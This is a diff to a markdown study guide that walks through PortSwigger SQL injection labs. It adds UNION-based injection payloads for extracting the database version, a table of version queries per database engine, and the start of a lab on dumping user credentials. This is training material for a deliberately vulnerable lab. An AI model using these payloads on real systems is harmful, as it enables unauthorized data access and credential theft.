@@ -867,7 +867,9 @@ To solve the lab, display the database version string.
 
 ![try columns input string a 'VULN' to try search in respone and frontend 0.7](images/lab-0.7-database-version/input-string-vuln-0.7.png)
 
-![try input @@version values to check version operating system 0.7](images/lab-0.7-database-version/check-version-0.7.png)
+![check version from cheatsheet sql injection 0.7](images/lab-0.7-database-version/cheatsheet-0.7.png)
+
+![try input @@version values to check database version 0.7](images/lab-0.7-database-version/check-version-0.7.png)
 
 ##### Tutorial
 
@@ -886,10 +888,21 @@ To solve the lab, display the database version string.
 ' UNION SELECT NULL,NULL--+
 ' UNION SELECT 'VULN','VULN'--+
 ```
-7. Last try to give a values to check version operating system use `@@VERSION`.
+7. Last try to give a values to check number version database use `@@VERSION`.
 ```SQL
 ' UNION SELECT @@version,'VULN'--+
 ```
+8. Cheatsheet can find `Database version for check information stack like a Oracle, Microsoft, PostgreSQL, MySQL. Link [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+```txt
+| Database | Query |
+| --- | --- |
+| Oracle | `SELECT banner FROM v$version;` |
+| Oracle | `SELECT version FROM v$instance;` |
+| Microsoft SQL Server | `SELECT @@VERSION;` |
+| PostgreSQL | `SELECT version();` |
+| MySQL | `SELECT @@VERSION;` |
+```
+
 
 ##### Reference
 
@@ -956,6 +969,21 @@ MyDatabase     dbo           Users       Password     varchar
 This output shows the columns in the specified table and the data type of each column.
 
 ##### Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.8</summary>
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the `administrator` user.
+
+>Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
+##### Tutorial
+
+</details>
 
 ## Blind SQL injection
 ### What is blind SQL injection?
